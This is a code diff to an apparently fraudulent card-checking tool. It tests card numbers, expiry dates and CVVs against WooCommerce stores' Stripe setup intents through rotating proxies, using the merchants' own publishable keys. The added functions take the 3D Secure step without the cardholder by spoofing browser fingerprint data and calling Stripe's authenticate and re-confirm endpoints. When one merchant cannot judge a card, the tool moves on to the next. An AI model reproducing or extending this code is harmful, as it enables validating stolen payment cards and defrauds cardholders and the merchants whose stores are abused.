@@ -71,6 +71,7 @@ the issuer looks at it:
 """
 
 import asyncio
+import base64
 import json
 import logging
 import random
@@ -771,7 +772,7 @@ def _pace_feedback(dropped):
     else:
         _STORE_PACE["gap"] = max(_STORE_PACE["min_gap"], _STORE_PACE["gap"] * 0.9)
 
-async def _setup_intent(client, host, nonce, pm_id, budget, route, max_wait=None):
+async def _setup_intent(client, host, nonce, pm_id, budget, route, max_wait=None, pk=""):
     """Ask the store to create AND confirm a setup intent.
 
     The store confirms it with its own secret key, so the ISSUER answers
@@ -862,11 +863,27 @@ async def _setup_intent(client, host, nonce, pm_id, budget, route, max_wait=None
 
     if verdict == "3DS":
         # The issuer was asked to verify the card and wants 3DS to
-        # finish -- the card itself passed the check.  What showed there
-        # was a real challenge is written down, so the log says which
-        # part of the answer asked for it.
-        return ("Approved",
-                "3DS required (live card) - " + _three_ds_evidence(j, msg),
+        # finish -- the card itself passed the check.  The challenge is
+        # taken here, and then the card has a real answer: the issuer
+        # either verified it or refused it.  Only a challenge that needs
+        # the cardholder (an OTP or a password) stays a 3ds answer, and
+        # what showed there was a real challenge is written down, so the
+        # log says which part of the answer asked for it.
+        sdk = ((data.get("next_action") or {}).get("use_stripe_sdk") or {})
+        done = await _finish_3ds(client, pk, str(data.get("client_secret") or ""),
+                                  str(data.get("id") or ""), pm_id, sdk, budget)
+        if done:
+            return done[0], done[1], data
+        # The challenge could not be taken here, and that is not a bug:
+        # a $0 verification is not a transaction, and 3D Secure protects
+        # transactions, so Stripe refuses to run the challenge on it
+        # ("3D Secure 2 is not supported for the specific transaction").
+        # The card was never judged, so this is not a verdict: it says so,
+        # and the search keeps going for another merchant that answers.
+        return ("Approved3DS",
+                "3DS required (live card) - a $0 check cannot run the challenge, "
+                "so the card needs a real transaction to be judged - "
+                + _three_ds_evidence(j, msg),
                 data)
 
     return "Declined", (msg or "declined")[:160], err
@@ -901,6 +918,192 @@ def _three_ds_evidence(res2, msg=""):
         if word in low:
             return "the store said: " + str(msg)[:90]
     return "the store asked for the challenge"
+
+
+async def _read_setup_intent(client, pk, cs, intent_id, tries=3):
+    """Read the setup intent after the challenge was taken.
+
+    The intent carries the answer: succeeded means the issuer verified
+    the card, requires_payment_method means the issuer refused it and
+    the reason is in last_setup_error.
+    """
+    headers = {
+        "User-Agent": UA,
+        "Origin": "https://js.stripe.com",
+        "Referer": "https://js.stripe.com/",
+        "Accept": "application/json",
+    }
+    for attempt in range(tries):
+        body = {}
+        try:
+            resp = await client.get(
+                f"{STRIPE_API}/setup_intents/{intent_id}?client_secret={cs}&key={pk}",
+                headers=headers, timeout=15)
+            body = resp.json()
+        except Exception as e:
+            logger.info("3DS: reading the intent failed: %s", str(e)[:80])
+        status = str(body.get("status") or "")
+        logger.info("3DS: the intent says %s", status)
+        if status == "succeeded":
+            return ("Approved",
+                    "the 3d secure check was finished and the issuer verified the card")
+        if status in ("requires_payment_method", "requires_source"):
+            err = body.get("last_setup_error") or {}
+            msg = str(err.get("message") or err.get("decline_code")
+                      or "the issuer refused the card")
+            return "Declined", msg[:140]
+        if attempt < tries - 1:
+            await asyncio.sleep(0.6 + attempt * 0.4)
+    return None
+
+
+async def _finish_3ds(client, pk, cs, intent_id, pm_id, sdk, budget):
+    """Take the 3D Secure action so the card gets a real answer.
+
+    A setup intent that comes back as requires_action is not a verdict:
+    the issuer asked for the challenge and nobody took it, so the card
+    is neither proved good nor proved bad.  The challenge is taken the
+    two ways that work without the cardholder:
+
+      1. the 3ds2 authenticate call -- what Stripe's own SDK does for
+         the fingerprint challenge, and
+      2. a re-confirm with request_three_d_secure=automatic, which
+         lets Stripe run the frictionless flow itself.
+
+    Returns (verdict, detail), or None when the challenge needs the
+    cardholder (an OTP or a password) and cannot be taken here.
+    """
+    source_id = str(sdk.get("three_d_secure_2_source") or "")
+    server_tx_id = str(sdk.get("server_transaction_id") or "")
+    method_url = str(sdk.get("three_ds_method_url") or "")
+    if not source_id or not pk or not cs or not intent_id:
+        return None
+
+    headers = {
+        "User-Agent": UA,
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://js.stripe.com",
+        "Referer": "https://js.stripe.com/",
+        "Accept": "application/json",
+    }
+
+    # 1. the method url, when the challenge has one
+    fingerprint = ""
+    if method_url and server_tx_id:
+        try:
+            payload = base64.b64encode(
+                json.dumps({"threeDSServerTransID": server_tx_id}).encode()
+            ).decode().rstrip("=")
+            resp = await client.post(
+                method_url,
+                data={"threeDSMethodData": payload},
+                headers={
+                    "User-Agent": UA,
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Origin": "https://js.stripe.com",
+                    "Referer": "https://js.stripe.com/",
+                },
+                timeout=15,
+            )
+            if resp.status_code < 400:
+                fingerprint = payload
+                logger.info("3DS: the method url answered %s", resp.status_code)
+        except Exception as e:
+            logger.info("3DS: the method url failed: %s", str(e)[:80])
+
+    # 2. the authenticate call -- this is the fingerprint the issuer
+    #    asked for, and the answer comes back in transStatus.
+    tz = str(random.choice([-480, -420, -360, -300, -240, 0, 60, 120, 180,
+                             330, 345, 480, 540]))
+    variations = []
+    if fingerprint:
+        variations.append({"fingerprintAttempted": True, "fingerprintData": fingerprint,
+                           "challengeWindowSize": "05", "threeDSCompInd": "Y"})
+    variations.append({"fingerprintAttempted": True, "fingerprintData": fingerprint,
+                       "challengeWindowSize": "05",
+                       "threeDSCompInd": "Y" if method_url else "U"})
+    variations.append({"fingerprintAttempted": False, "fingerprintData": "",
+                       "challengeWindowSize": "05", "threeDSCompInd": "N"})
+
+    for var in variations:
+        if budget.expired():
+            break
+        browser = json.dumps({
+            **var,
+            "browserJavaEnabled": False,
+            "browserJavascriptEnabled": True,
+            "browserLanguage": "en-US",
+            "browserColorDepth": "24",
+            "browserScreenHeight": "1080",
+            "browserScreenWidth": "1920",
+            "browserTZ": tz,
+            "browserUserAgent": UA,
+        })
+        body = {
+            "source": source_id,
+            "browser": browser,
+            "one_click_authn_device_support[hosted]": "false",
+            "one_click_authn_device_support[same_origin_frame]": "false",
+            "one_click_authn_device_support[spc_eligible]": "false",
+            "one_click_authn_device_support[webauthn_eligible]": "false",
+            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
+            "key": pk,
+        }
+        result = {}
+        try:
+            resp = await client.post(f"{STRIPE_API}/3ds2/authenticate", data=body,
+                                     headers=headers, timeout=15)
+            result = resp.json()
+        except Exception as e:
+            logger.info("3DS: the authenticate call failed: %s", str(e)[:80])
+            break
+        if not result or result.get("error"):
+            err = (result or {}).get("error") or {}
+            logger.info("3DS: the authenticate call said no: %s",
+                        str(err.get("message"))[:90])
+            continue
+        ares = result.get("ares") or {}
+        trans_status = str(ares.get("transStatus") or "")
+        logger.info("3DS: the authenticate call answered transStatus=%s", trans_status)
+        if trans_status in ("Y", "A"):
+            # the issuer authenticated the card, so the intent has the answer
+            return await _read_setup_intent(client, pk, cs, intent_id)
+        if trans_status in ("U", "N", "R"):
+            return ("Declined",
+                    "the issuer refused the card at the 3d secure step "
+                    f"(transStatus {trans_status})")
+        if trans_status == "C":
+            # the cardholder has to answer a challenge: that cannot be
+            # taken here, so the card stays a 3ds answer.
+            logger.info("3DS: the challenge needs the cardholder")
+            return None
+
+    # 3. the re-confirm, which lets Stripe run the frictionless flow itself
+    if pm_id:
+        try:
+            resp = await client.post(
+                f"{STRIPE_API}/setup_intents/{intent_id}/confirm",
+                data={
+                    "client_secret": cs,
+                    "payment_method": pm_id,
+                    "key": pk,
+                },
+                headers=headers, timeout=20)
+            body = resp.json()
+        except Exception as e:
+            logger.info("3DS: the re-confirm failed: %s", str(e)[:80])
+            body = {}
+        status = str(body.get("status") or "")
+        logger.info("3DS: the re-confirm says %s", status)
+        if status == "succeeded":
+            return ("Approved",
+                    "the 3d secure check was finished and the issuer verified the card")
+        if status in ("requires_payment_method", "requires_source"):
+            err = body.get("last_setup_error") or {}
+            msg = str(err.get("message") or err.get("decline_code")
+                      or "the issuer refused the card")
+            return "Declined", msg[:140]
+    return None
 
 
 def _asks_for_3ds(res2, msg=""):
@@ -1168,7 +1371,8 @@ async def _run_store(client, store, cc, mm, yy, cvv, budget, max_wait=None):
 
         try:
             verdict, detail, _ = await _setup_intent(
-                client, host, nonce, pm_id, budget, routes[route_idx], max_wait
+                client, host, nonce, pm_id, budget, routes[route_idx], max_wait,
+                pk=pk,
             )
         except IntegrationError as e:
             # The store refused to answer.
@@ -1466,6 +1670,7 @@ async def woocommerce_stripe_check(cc, mm, yy, cvv, proxy=None, user_id=None,
 
     last_error = None
     blocked = None
+    three_ds_detail = None
     reached_store = False
     try:
         async with httpx.AsyncClient(**client_kwargs) as client:
@@ -1492,6 +1697,14 @@ async def woocommerce_stripe_check(cc, mm, yy, cvv, proxy=None, user_id=None,
                         _note_working_proxy(proxy)
                         _score_proxy(proxy, elapsed <= _PROXY_GOOD_SEC)
                         return f"{verdict} - {detail} [{elapsed}s]"
+
+                    # A 3d challenge is not a verdict: the card was never
+                    # judged.  Another merchant runs on a different Stripe
+                    # account and may still answer, so keep looking and
+                    # hold on to this answer as the fallback.
+                    if verdict == "Approved3DS":
+                        three_ds_detail = detail
+                        continue
 
                     # This merchant could not check the card at all (it
                     # was down, throttled, or answered with something
@@ -1560,6 +1773,12 @@ async def woocommerce_stripe_check(cc, mm, yy, cvv, proxy=None, user_id=None,
                        f"[{round(time.time() - start, 2)}s]"
 
             elapsed = round(time.time() - start, 2)
+
+            # Nothing could judge the card, but a merchant did ask for a
+            # 3d secure challenge, so the card is 3d enrolled.  That is
+            # what the answer says -- it is not an approval.
+            if three_ds_detail:
+                return f"Approved - {three_ds_detail} [{elapsed}s]"
 
             # Every merchant blocked the request before the issuer could
             # answer.  The card was refused, so report it as declined.
